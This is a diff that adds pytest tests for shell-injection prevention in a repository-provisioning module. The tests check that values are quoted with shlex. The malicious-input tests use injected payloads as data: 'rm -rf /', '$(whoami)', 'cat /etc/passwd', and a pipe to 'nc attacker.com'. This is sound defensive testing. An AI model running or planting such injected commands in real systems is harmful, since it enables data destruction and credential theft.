@@ -660,6 +660,119 @@ class TestProcessCleanup:
         assert len(startup._spawned_pids) == 0
 
 
+class TestThreadsProvisioningShellSafety:
+    """Tests for shell injection prevention in threads repo provisioning."""
+
+    def test_as_shell_safe_dict_quotes_values(self):
+        """Test that ProvisioningContext.as_shell_safe_dict quotes all values."""
+        from watercooler_mcp.provisioning import ProvisioningContext
+
+        ctx = ProvisioningContext(
+            slug="org/my-repo",
+            repo_url="https://github.com/org/my-repo.git",
+            code_repo="my-code-repo",
+            namespace="org",
+            repo="my-repo",
+            org="org",
+        )
+
+        safe_dict = ctx.as_shell_safe_dict()
+
+        # All values should be quoted (shlex.quote adds quotes)
+        for key, value in safe_dict.items():
+            # shlex.quote returns the value with quoting if needed
+            assert value, f"Value for {key} should not be empty"
+
+    def test_as_shell_safe_dict_escapes_shell_metacharacters(self):
+        """Test that shell metacharacters are properly escaped."""
+        from watercooler_mcp.provisioning import ProvisioningContext
+        import shlex
+
+        # Create context with malicious values
+        ctx = ProvisioningContext(
+            slug="org/repo; rm -rf /",
+            repo_url="https://github.com/$(whoami)/repo.git",
+            code_repo="repo`id`",
+            namespace="org && cat /etc/passwd",
+            repo="repo | nc attacker.com",
+            org="org",
+        )
+
+        safe_dict = ctx.as_shell_safe_dict()
+
+        # Verify each value is properly quoted
+        for key, value in safe_dict.items():
+            # The value should be shell-safe (re-parsing should give original)
+            # If properly quoted, shlex.split should return the quoted string
+            assert "; rm -rf /" not in value or "'" in value or '"' in value
+            assert "$(whoami)" not in value or "'" in value
+            assert "`id`" not in value or "'" in value or "\\" in value
+
+    def test_provision_via_cli_uses_shell_safe_values(self, monkeypatch, tmp_path):
+        """Test that provision_threads_repo uses shell-safe values."""
+        from watercooler_mcp.provisioning import provision_threads_repo, PROVISION_CMD_ENV
+        import subprocess
+
+        captured_command = []
+
+        def mock_run(command, **kwargs):
+            captured_command.append(command)
+            result = subprocess.CompletedProcess(command, 0, stdout="", stderr="")
+            return result
+
+        monkeypatch.setattr(subprocess, "run", mock_run)
+
+        # Use a template that uses the slug
+        monkeypatch.setenv(PROVISION_CMD_ENV, "echo {slug}")
+        # Clear GITHUB_TOKEN so we use CLI path
+        monkeypatch.delenv("GITHUB_TOKEN", raising=False)
+        monkeypatch.delenv("GH_TOKEN", raising=False)
+
+        # Attempt provisioning with malicious slug
+        malicious_slug = "org/repo; cat /etc/passwd"
+
+        try:
+            provision_threads_repo(
+                repo_url="git@github.com:org/repo.git",  # SSH URL to avoid API path
+                slug=malicious_slug,
+                code_repo="code-repo",
+            )
+        except Exception:
+            pass  # Command may fail, we just want to check what was passed
+
+        # The captured command should have the slug properly quoted
+        if captured_command:
+            cmd = captured_command[0]
+            # The semicolon should be quoted, not treated as command separator
+            assert "; cat" not in cmd or "'" in cmd
+            # The command should contain the slug in quoted form
+            assert "org/repo" in cmd
+
+    def test_provision_context_as_dict_vs_shell_safe(self):
+        """Test difference between as_dict and as_shell_safe_dict."""
+        from watercooler_mcp.provisioning import ProvisioningContext
+
+        ctx = ProvisioningContext(
+            slug="org/repo",
+            repo_url="https://github.com/org/repo.git",
+            code_repo="code-repo",
+            namespace="org",
+            repo="repo",
+            org="org",
+        )
+
+        regular_dict = ctx.as_dict()
+        safe_dict = ctx.as_shell_safe_dict()
+
+        # Regular dict has raw values
+        assert regular_dict["slug"] == "org/repo"
+
+        # Safe dict has quoted values (shlex.quote on a safe value may or may not add quotes)
+        # but for values with special chars, it definitely adds quotes
+        import shlex
+        assert safe_dict["slug"] == shlex.quote("org/repo")
+
+
 class TestAutoProvisionConfig:
     """Tests for auto-provisioning configuration."""
 
